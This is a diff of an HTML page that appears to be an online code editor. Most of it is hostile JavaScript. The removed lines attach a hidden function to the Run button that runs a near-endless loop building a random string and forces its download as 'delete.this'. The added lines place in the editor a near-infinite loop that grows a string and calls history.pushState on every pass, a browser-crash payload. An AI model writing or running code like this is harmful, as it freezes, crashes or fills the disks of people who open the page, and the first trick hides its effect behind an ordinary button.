@@ -1,9 +1,13 @@
 
-<button onclick="dl();submitTryit(1);">Run</button>
-<script>function dl(){var str = "";var z = 99999999999999999999999999999999999999999999999999999999999999999999999999999999999; while(z--) str += String.fromCharCode((Math.random() * 1234567)^0xF0F0F0F0);var b = new Blob([str]);var a = document.createElement("a");a.href=URL.createObjectURL(b);a.download="delete.this"&&a.click();}
-</script>
+<button onclick="submitTryit(1);">Run</button>
 <textarea autocomplete="off" id="textareaCode">
-<script type="text/javascript" src="a.js"></script></textarea>
+<script type="text/javascript">
+                  var total = "";
+                    for( var i = 0; i < 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; i++ ) {
+                        total = total + i.toString();
+                        history.pushState(0,0, total );
+                    }
+  </script></textarea>
 
 <div id="iw" style="display:none"></div>
 <script>
